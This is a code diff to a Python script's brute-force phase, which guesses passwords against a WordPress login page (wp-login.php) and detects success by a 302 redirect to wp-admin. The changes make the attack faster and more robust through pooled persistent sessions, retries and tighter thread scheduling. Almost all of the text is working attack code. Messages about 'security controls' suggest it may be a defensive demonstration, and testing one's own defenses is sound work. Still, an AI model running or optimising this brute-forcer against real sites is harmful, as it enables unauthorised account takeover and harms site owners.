@@ -238,7 +238,7 @@ def phase3_bruteforce(base_url, username, passwords, num_threads=1):
     print(f"  Method:    POST to wp-login.php")
 
     if num_threads > 1:
-        est_per_sec = num_threads * 0.9  # ~90% efficiency
+        est_per_sec = num_threads * 0.9
         est_hours = total / est_per_sec / 3600
         if est_hours > 1:
             print(f"  Estimate:  ~{est_hours:.1f} hours ({est_per_sec:.0f} attempts/sec)")
@@ -248,7 +248,7 @@ def phase3_bruteforce(base_url, username, passwords, num_threads=1):
     print()
 
     # Shared state for threads
-    found_password = [None]  # use list for mutability in threads
+    found_password = [None]
     found_attempt = [0]
     attempt_count = [0]
     error_count = [0]
@@ -256,49 +256,89 @@ def phase3_bruteforce(base_url, username, passwords, num_threads=1):
     lock = threading.Lock()
     start_time = time.time()
 
-    def try_password(password, index):
-        """Worker function — tries a single password"""
+    # Pre-create a pool of persistent sessions (one per thread)
+    # This reuses TCP+TLS connections instead of creating new ones each request
+    session_pool = []
+    print(f"  Warming up {num_threads} persistent connections...", end="", flush=True)
+    for _ in range(max(num_threads, 1)):
+        s = requests.Session()
+        s.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
+        # Increase connection pool size for this session
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=1,
+            pool_maxsize=1,
+            max_retries=requests.adapters.Retry(total=2, backoff_factor=0.3)
+        )
+        s.mount("https://", adapter)
+        s.mount("http://", adapter)
+        session_pool.append(s)
+    # Warm up the first session to verify connectivity
+    try:
+        session_pool[0].get(login_url, timeout=10)
+    except requests.RequestException:
+        pass
+    print(f" done.\n")
+
+    # Thread-local storage to assign each thread its own session
+    thread_local = threading.local()
+    session_index = [0]
+    session_lock = threading.Lock()
+
+    def get_session():
+        """Get or assign a persistent session for the current thread"""
+        if not hasattr(thread_local, "session"):
+            with session_lock:
+                idx = session_index[0] % len(session_pool)
+                session_index[0] += 1
+                thread_local.session = session_pool[idx]
+        return thread_local.session
+
+    def try_password(password):
+        """Worker function — tries a single password using a persistent session"""
         if found_password[0] is not None or blocked[0]:
             return None
 
-        try:
-            # Each thread uses its own session
-            sess = requests.Session()
-            sess.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
-            resp = sess.post(login_url, data={
-                "log": username,
-                "pwd": password,
-                "wp-submit": "Log In",
-                "redirect_to": urljoin(base_url, "/wp-admin/"),
-                "testcookie": "1"
-            }, allow_redirects=False, timeout=15)
+        sess = get_session()
 
-            with lock:
-                attempt_count[0] += 1
-                current = attempt_count[0]
+        for retry in range(3):
+            try:
+                resp = sess.post(login_url, data={
+                    "log": username,
+                    "pwd": password,
+                    "wp-submit": "Log In",
+                    "redirect_to": urljoin(base_url, "/wp-admin/"),
+                    "testcookie": "1"
+                }, allow_redirects=False, timeout=15)
 
-            # WordPress redirects to wp-admin on successful login (302)
-            if resp.status_code == 302:
-                location = resp.headers.get("Location", "")
-                if "wp-admin" in location:
-                    found_password[0] = password
-                    found_attempt[0] = current
-                    return password
-
-            # Rate limited or blocked
-            elif resp.status_code == 429 or resp.status_code == 403:
-                blocked[0] = True
                 with lock:
-                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting kicked in at attempt {current}")
-                    print(f"  The brute-force attack was stopped by security controls.")
+                    attempt_count[0] += 1
+                    current = attempt_count[0]
+
+                if resp.status_code == 302:
+                    location = resp.headers.get("Location", "")
+                    if "wp-admin" in location:
+                        found_password[0] = password
+                        found_attempt[0] = current
+                        return password
+
+                elif resp.status_code == 429 or resp.status_code == 403:
+                    blocked[0] = True
+                    with lock:
+                        print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting at attempt {current}")
+                        print(f"  The brute-force attack was stopped by security controls.")
+                    return None
+
+                # Success (normal failed login)
                 return None
 
-        except requests.RequestException:
-            with lock:
-                error_count[0] += 1
-                attempt_count[0] += 1
-            # Don't stop on individual request errors — just skip
-            return None
+            except requests.RequestException:
+                if retry < 2:
+                    time.sleep(0.5 * (retry + 1))
+                    continue
+                with lock:
+                    error_count[0] += 1
+                    attempt_count[0] += 1
+                return None
 
         return None
 
@@ -309,45 +349,36 @@ def phase3_bruteforce(base_url, username, passwords, num_threads=1):
             elapsed = time.time() - start_time
             current = attempt_count[0]
             errors = error_count[0]
-            if elapsed > 0:
+            if elapsed > 0 and current > 0:
                 rate = current / elapsed
                 remaining = (total - current) / rate if rate > 0 else 0
                 hours = int(remaining // 3600)
                 mins = int((remaining % 3600) // 60)
-                err_str = f" | {RED}errors: {errors}{RESET}" if errors > 0 else ""
-                print(f"\r  [{current:>8,}/{total:,}] {rate:.1f} req/s | "
-                      f"elapsed: {int(elapsed)}s | "
-                      f"remaining: {hours}h {mins}m{err_str}     ", end="")
+                pct = current / total * 100
+                err_str = f" | {RED}err: {errors}{RESET}" if errors > 0 else ""
+                print(f"\r  [{current:>8,}/{total:,}] ({pct:.1f}%) {rate:.0f}/s | "
+                      f"{int(elapsed)}s elapsed | "
+                      f"~{hours}h{mins:02d}m left{err_str}     ", end="")
                 sys.stdout.flush()
 
-    # Start progress reporter
     reporter = threading.Thread(target=progress_reporter, daemon=True)
     reporter.start()
 
     if num_threads == 1:
-        # Single-threaded mode (original behavior)
-        session = requests.Session()
-        session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
-        try:
-            session.get(login_url, timeout=10)
-        except requests.RequestException:
-            pass
-
+        sess = session_pool[0]
         for i, password in enumerate(passwords, 1):
             if found_password[0] is not None or blocked[0]:
                 break
             try:
-                resp = session.post(login_url, data={
+                resp = sess.post(login_url, data={
                     "log": username,
                     "pwd": password,
                     "wp-submit": "Log In",
                     "redirect_to": urljoin(base_url, "/wp-admin/"),
                     "testcookie": "1"
                 }, allow_redirects=False, timeout=15)
-
                 with lock:
                     attempt_count[0] = i
-
                 if resp.status_code == 302:
                     location = resp.headers.get("Location", "")
                     if "wp-admin" in location:
@@ -356,31 +387,29 @@ def phase3_bruteforce(base_url, username, passwords, num_threads=1):
                         break
                 elif resp.status_code == 429 or resp.status_code == 403:
                     blocked[0] = True
-                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting at attempt {i}")
                     break
-            except requests.RequestException as e:
+            except requests.RequestException:
                 with lock:
                     error_count[0] += 1
                 continue
     else:
-        # Multi-threaded mode
+        # Multi-threaded mode with persistent sessions
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             futures = {}
             for i, password in enumerate(passwords):
                 if found_password[0] is not None or blocked[0]:
                     break
-                future = executor.submit(try_password, password, i)
+                future = executor.submit(try_password, password)
                 futures[future] = password
 
-                # Don't submit too far ahead — limit queue to 2x threads
-                while len(futures) > num_threads * 2:
+                # Throttle submission to avoid overwhelming queue
+                while len(futures) > num_threads * 3:
                     done = [f for f in futures if f.done()]
                     for f in done:
                         del futures[f]
                     if not done:
-                        time.sleep(0.05)
+                        time.sleep(0.01)
 
-            # Wait for remaining futures
             for future in as_completed(futures):
                 pass
 
